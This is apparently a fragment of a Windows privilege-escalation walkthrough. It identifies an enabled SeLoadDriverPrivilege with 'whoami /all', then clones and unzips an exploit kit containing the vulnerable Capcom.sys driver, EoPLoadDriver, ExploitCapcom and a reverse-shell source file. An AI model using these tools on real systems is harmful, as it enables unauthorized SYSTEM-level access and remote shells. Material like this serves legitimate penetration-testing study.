Identify Vulnerability

```bash

PS C:\Users\hnl\Desktop> whoami /all

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeLoadDriverPrivilege         Load and unload device drivers Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Download and unzip it, you will get four files such as Simple_Rev_Shell.cs, Capcom.sys, EoPLoadDriver and ExploitCapcom

```bash
% git clone https://github.com/0xhnl/seloaddriver.git
Cloning into 'seloaddriver'...
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (2/2), done.
Receiving objects: 100% (3/3), 7.69 KiB | 7.69 MiB/s, done.
remote: Total 3 (delta 0), reused 3 (delta 0), pack-reused 0
% unzip seloaddriver/seloaddriver.zip 
Archive:  seloaddriver/seloaddriver.zip
  inflating: Capcom.sys              
   creating: EoPLoadDriver/
   creating: ExploitCapcom/
  inflating: Simple_Rev_Shell.cs
```
